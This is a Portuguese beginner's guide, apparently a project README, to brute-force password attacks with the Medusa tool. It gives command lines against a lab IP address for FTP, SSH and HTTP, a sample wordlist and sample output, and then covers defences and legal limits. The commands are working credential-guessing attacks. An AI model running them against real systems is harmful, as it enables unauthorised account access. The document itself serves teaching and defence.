# 🔐 Ataques de Força Bruta com Medusa - Para Iniciantes

## O Que É Este Projeto?

Um guia que ensina:
- O que é força bruta
- Como usar a ferramenta Medusa
- Como se defender

**Nível:** Iniciante (não precisa de experiência prévia)

---

## 🎯 O Que Você Vai Aprender

### 1️⃣ O Que É Força Bruta?

Imagine que você esqueceu a senha do seu email. A forma mais simples é tentar várias senhas até
acertar:

**Exemplo:**
```
Tentativa 1: password ❌
Tentativa 2: 123456 ❌
Tentativa 3: admin ✅ ACERTOU!
```

Força bruta = tentar muitas senhas até acertar uma

### 2️⃣ O Que É Medusa?

Medusa é um programa que testa senhas automaticamente.
Em vez de você digitar cada senha manualmente, Medusa faz isso milhões de vezes por segundo!

### 3️⃣ Como Se Defender?

Usando senhas fortes e proteções adicionais.

---

### Comando Básico

```
medusa -h [IP] -u [USUARIO] -P [SENHAS] -M [TIPO]
```

-h 192.168.1.100 = Computador alvo (o IP)

-u admin = Usuário que vamos testar

-P senhas.txt = Arquivo com lista de senhas

-M ftp = Tipo de serviço (FTP, SSH, etc)

Exemplo:
```
medusa -h 192.168.56.101 -u admin -P senhas.txt -M ftp
```

" Testa a senha do usuário admin no computador 192.168.56.101 usando as senhas do arquivo senhas.txt no serviço FTP "

### Como utilizar

###   1 - Criar Lista de Senhas

Crie um arquivo de texto com senhas (uma por linha):

```
cat > senhas.txt << EOF
password
123456
admin
welcome
EOF
```

###   2 - Executar o Medusa

Execute o Medusa utilizando a sua wordlist .

```
medusa -h 192.168.56.101 -u admin -P senhas.txt -M ftp
 ```

Se der certo, você verá:
```
ACCOUNT FOUND: [ftp] Host: 192.168.56.101
User: admin
Password: password
[SUCCESS]
```

### Os 3 Serviços Principais

1. FTP (Transferência de Arquivos)
   
```
   medusa -h 192.168.56.101 -u admin -P senhas.txt -M ftp
   ```
  Vulnerabilidades:
  
  - Autenticação em texto claro (não criptografada)
  
  - Sem limite de tentativas por padrão
  
 -  Versões antigas com backdoors conhecidas

2. SSH (Acesso Remoto)
```
medusa -h 192.168.56.101 -u admin -P senhas.txt -M ssh
```

3. HTTP (Sites Web)
```
medusa -h 192.168.56.101 -u admin -P senhas.txt -M http
```

Obs. A ferramenta Hydra tende a ser mais efetiva em formulários Web.



### Como se defender:

Regras de Senha Forte:

- Mínimo 12 caracteres

- Maiúsculas + minúsculas + números + símbolos

-  Sem padrões (não usar 123456 ou qwerty)

- Sem informações pessoais

-  Única para cada site/serviço

Mais Proteções:
-  Limite de tentativas: Bloquear após 3 erros
-  Delay: Esperar 1 segundo entre tentativas
-  Monitorar:  Alertar se muitas falhas


### Ética e Legalidade
  Quando é legal:
  - Seu próprio sistema;
  - Com permissão explicita expressa;
  - Em ambiente de laboratório/testes.

  Quando é Ilegal:
  - Sistema alheios;
  - Sem permissão;
  - Roubo de dados;
  - Acesso não autorizado.
---
